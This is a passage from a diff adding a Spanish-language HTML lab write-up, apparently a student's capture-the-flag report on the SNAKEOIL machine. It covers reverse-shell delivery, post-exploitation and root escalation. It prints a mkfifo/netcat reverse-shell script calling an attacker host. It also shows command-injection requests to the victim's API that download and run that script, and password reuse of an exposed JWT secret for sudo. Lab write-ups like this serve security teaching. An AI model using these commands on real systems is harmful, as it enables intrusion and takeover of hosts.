+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Creación del script de reverse shell interactivo localmente</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ cat > ~/shell2.sh << 'EOF'<br>#!/bin/sh<br>rm -f /tmp/f<br>mkfifo /tmp/f<br>cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.15 4444 > /tmp/f<br>EOF</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Antes de atacar, se verificó localmente que el servidor temporal lo estuviera sirviendo correctamente:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Verificación local del script para descartar errores antes del ataque</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl http://10.0.2.15/shell2.sh</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Aprovechando que la aplicación ejecuta <code>curl</code>, se instruyó a la máquina víctima descargar el script y guardarlo en el directorio temporal.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Ordenando a la víctima que descargue nuestro script malicioso y lo guarde</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -X POST http://10.0.2.4:8080/run \<br>    -H "Content-Type: application/json" \<br>    -d '{"url":"curl http://10.0.2.15/shell2.sh -o /tmp/s2.sh", "secret_key":"commandexecutionissecret"}'</div>
+                </div>
+
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Antes de lanzar la orden de ejecución, se preparó el oyente en Kali con Netcat:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Oyente de Netcat en Kali esperando la conexión de la víctima</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ nc -lvnp 4444</div>
+                </div>
+
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Finalmente, se envió la orden de ejecución a través de la API:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner">
+                    <div class="text-gray-500 italic mb-2"># Ejecución del payload descargado en la víctima</div>
+                    <div class="text-ctosBlue font-bold">(kali㉿kali)-[~]</div>
+                    <div class="text-green-400">$ curl -X POST http://10.0.2.4:8080/run \<br>    -H "Content-Type: application/json" \<br>    -d '{"url":"sh /tmp/s2.sh", "secret_key":"commandexecutionissecret"}'</div>
+                </div>
+            </section>
+
+            <!-- FASE 10 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_10
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    10. Post-explotación: TTY y análisis del código
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Recibida la conexión, se mejoró la shell creando una pseudo-terminal (TTY) con Python para habilitar interactividad completa.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Spawn de una TTY completa en la reverse shell recibida</div>
+                    <div class="text-green-400">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Al explorar el directorio del proyecto, se listaron los archivos y se leyó el código fuente del backend.
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Listando estructura del proyecto y leyendo la configuración central de Flask</div>
+                    <div class="text-gray-400">patrick@SNAKEOIL:~/flask_blog$ <span class="text-green-400">ls -l</span></div>
+                    <div class="text-gray-400">patrick@SNAKEOIL:~/flask_blog$ <span class="text-green-400">cat app.py</span></div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Este archivo contenía secretos <em>hardcodeados</em> en texto plano, incluyendo la clave criptográfica para los tokens JWT:
+                </p>
+                <div class="bg-[#0a0a0c] border border-red-900/50 p-4 font-mono text-sm overflow-x-auto shadow-inner">
+                    <div class="text-red-400">app.config['JWT_SECRET_KEY'] = 'NOreasonabLeDOUBTthisPASSWORDisGOOD'</div>
+                </div>
+            </section>
+
+            <!-- FASE 11 -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    PHASE_11
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24">
+                    11. Escalamiento de privilegios: de patrick a root
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed mb-4">
+                    Sabiendo que <code>patrick</code> pertenecía al grupo sudo, se probó el reciclaje de contraseñas utilizando la frase hallada en el código fuente de Flask:
+                </p>
+                <div class="bg-[#0a0a0c] border border-white/10 p-4 font-mono text-sm overflow-x-auto shadow-inner mb-4">
+                    <div class="text-gray-500 italic mb-2"># Escalamiento al usuario root mediante el reciclaje del secreto JWT</div>
+                    <div class="text-gray-400">patrick@SNAKEOIL:~/flask_blog$ <span class="text-green-400">sudo su</span></div>
+                    <div class="text-gray-400">[sudo] password for patrick: <span class="text-white">NOreasonabLeDOUBTthisPASSWORDisGOOD</span></div>
+                    <div class="text-ctosBlue font-bold mt-2">root@SNAKEOIL:/home/patrick/flask_blog#</div>
+                </div>
+                <p class="font-mono text-sm md:text-base text-green-500 leading-relaxed">
+                    > El escalamiento a root fue exitoso.
+                </p>
+            </section>
+
+            <!-- FASE 12 / CONCLUSIÓN -->
+            <section class="border border-white/5 bg-black/40 p-6 pt-10 md:pt-6 relative">
+                <div class="absolute top-0 right-0 bg-ctosBlue/10 border-l border-b border-ctosBlue/40 px-3 py-1 font-cyber text-[10px] md:text-xs font-bold text-ctosBlue tracking-widest animate-pulse">
+                    SYS_CONCLUSION
+                </div>
+                <h3 class="text-xl md:text-2xl font-cyber font-bold text-white uppercase tracking-widest border-b border-ctosBlue/30 pb-3 mb-4 pr-24 flex items-center gap-3">
+                    <svg class="w-6 h-6 text-ctosBlue" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="square" stroke-linejoin="miter" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    12. Conclusión
+                </h3>
+                <p class="font-mono text-sm md:text-base text-gray-300 leading-relaxed border-l-2 border-ctosBlue pl-4 bg-black/50 p-4">
+                    El ejercicio demostró que una intrusión completa no depende de un solo exploit sofisticado, sino de encadenar decisiones metodológicas: elegir ARP sobre ping, interpretar un error 405 como pista, iterar sobre el transporte del token JWT, interpretar correctamente un timeout como señal de éxito en una reverse shell, y escalar privilegios probando la reutilización de contraseñas expuestas en el código fuente.
+                </p>
+            </section>
+
+        </div>
+    </main>
+
+    <!-- PIE DE PÁGINA -->
+    <footer class="mt-auto py-8 text-center text-xs text-gray-500 font-cyber tracking-widest uppercase relative z-10 bg-black/90 border-t border-ctosBlue/30 w-full">
+        <p>ctOS v2.0 // &copy; 2026 Samuel López Gómez/All rights reserved.</p>
+        <p class="mt-2 text-white">RED DE VIGILANCIA COMPROMETIDA // CNO IV – Seguridad Informática</p>
+    </footer>
+
+    <script>
+        // EFECTO TELEMETRÍA HEADER
+        const nameElement = document.getElementById('telemetry-name');
+        if (nameElement) {
+            const originalText = nameElement.getAttribute('data-value');
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*<>";
+            function runTelemetryEffect() {
+                let iteration = 0;
+                clearInterval(nameElement.interval);
+                nameElement.interval = setInterval(() => {
+                    nameElement.innerText = originalText.split("").map((letter, index) => {
+                        if (letter === " ") return " ";
+                        if (index < iteration) return originalText[index];
+                        return chars[Math.floor(Math.random() * chars.length)];
+                    }).join("");
+                    if (iteration >= originalText.length) {
+                        clearInterval(nameElement.interval);
+                        setTimeout(runTelemetryEffect, 4000);
+                    }
+                    iteration += 1 / 3;
+                }, 30);
+            }
+            runTelemetryEffect();
+        }
+
+        // FONDO MATRIX
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const charArray = "010101100100101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split('');
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let x = 0; x < columns; x++) { drops[x] = Math.random() * -100; }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(5, 5, 7, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00a8ff';
+            ctx.font = fontSize + 'px "Fira Code", monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                ctx.fillText(charArray[Math.floor(Math.random() * charArray.length)], i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+    </script>
+</body>
+</html>
